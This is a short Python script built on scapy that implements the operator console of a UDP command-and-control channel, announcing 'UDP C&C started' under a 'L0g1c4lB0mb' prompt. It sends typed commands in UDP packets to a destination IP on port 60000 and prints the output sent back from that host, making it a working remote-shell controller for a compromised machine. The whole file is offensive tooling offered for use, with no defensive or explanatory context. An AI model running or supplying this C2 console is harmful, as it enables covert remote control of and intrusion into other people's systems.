from scapy.all import sr,IP,UDP,Raw,sniff
from multiprocessing import Process
import argparse
TTL = int(60)
parser = argparse.ArgumentParser()
parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")
args = parser.parse_args()

def sniffer():
    sniff(prn=shell,filter="udp",store='0')

def shell(pkt):
    if pkt[Raw].load and pkt[IP].src == args.destination_ip:
        udppaket = (pkt[Raw].load).decode('utf-8', errors='ignore').replace('\n', '')
        print(udppaket)
    else:
        pass

def main():
    sniffing = Process(target=sniffer)
    sniffing.start()
    print("UDP C&C started")
    while True:
        res = input('L0g1c4lB0mb ➮ ')
        if res == 'exit':
            sniffing.terminate()
            break
        elif res == '':
            pass
        else:
            payload = (IP(dst=args.destination_ip,ttl=TTL)/UDP(sport=53555, dport=60000)/Raw(load=res))
            sr(payload,timeout=0,verbose=0)
    sniffing.join()

if __name__ == "__main__":
    main()